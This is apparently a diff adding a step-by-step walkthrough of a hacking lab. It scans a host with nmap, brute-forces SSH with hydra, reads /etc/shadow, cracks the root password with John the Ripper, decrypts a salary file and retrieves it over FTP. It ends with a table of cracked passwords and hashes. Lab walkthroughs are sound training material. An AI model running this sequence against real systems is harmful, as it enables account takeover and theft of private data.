@@ -1,0 +1,145 @@
+nmap -n 192.168.1.1-255
+
+nmap -n -sS -sV -O 192.168.1.100
+
+firefox 192.168.1.100
+
+[+]kate -> make list of possible usernames. Save. Filename: usernames
+// lastF, fLast
+
+hydra 192.168.1.100 ssh2 -L /root/usernames -p password -e s
+
+ssh bbanter@192.168.1.100
+// "Yes" if quiz about trusting authenticity. Password: bbanter
+
+cd /etc/
+
+cat passwd
+
+[+]kate -> Update usernames. Save.
+
+cat group
+
+exit
+
+cd /root/tools/dictionary/
+
+cat common-1 common-2 common-3 common-4 wordlist.txt >> /root/passwords
+
+hydra 192.168.1.100 ssh2 -V -l aadams -P /root/passwords
+
+ssh aadams@192.168.1.100
+// Password: nostradamus
+
+cd /etc/
+
+sudo cat shadow
+// Password: nostradamus
+
+[+]kate -> New -> Paste -> Save. Filename: shadow
+
+exit
+
+john
+
+./john --rules --wordlist=/root/passwords --users=root /root/shadow
+// Password: tarot
+
+ssh aadams@192.168.1.100
+// Password: nostradamus
+
+su
+// Password: tarot
+
+ls -a
+
+cd ..
+
+
+
+ls -a
+
+cd ftp
+/
+
+ls -a
+
+cd incoming/
+
+ls -a
+
+openssl enc -d -aes-128-cbc -in salary_dec2003.csv.enc -out salary.csv -k tarot
+
+cd /etc/
+
+vi vsftpd.conf
+// edit (by pressing i) vsftpd.conf to have a '#' in front of 'listen=YES' (last line). Then save it (:w), and exit (:quit)
+
+modprobe capability
+
+exit
+
+exit
+
+ftp 192.168.1.100
+// User: root. Password: tarot
+
+ls -a
+
+
+
+cd ..
+
+
+ls -a
+
+
+
+cd home
+
+
+
+ls -a
+
+
+
+cd ftp
+
+
+
+ls -a
+
+
+
+cd incoming
+
+
+
+ls -a
+
+
+get salary.csv
+
+
+
+cd /pentest/passwords/jtr
+
+ls
+
+
+
+mv salary.csv ~
+
+[+]kate -> salary.csv
+
+// GAME OVER
+
+
+
+----------------------------------------------------------------------------------------------------
+Users
+root:tarot           = root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
+aadams:nostradamus   = aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
+bbanter:bbanter      = bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
+ccoffee:hierophant   = ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
+----------------------------------------------------------------------------------------------------
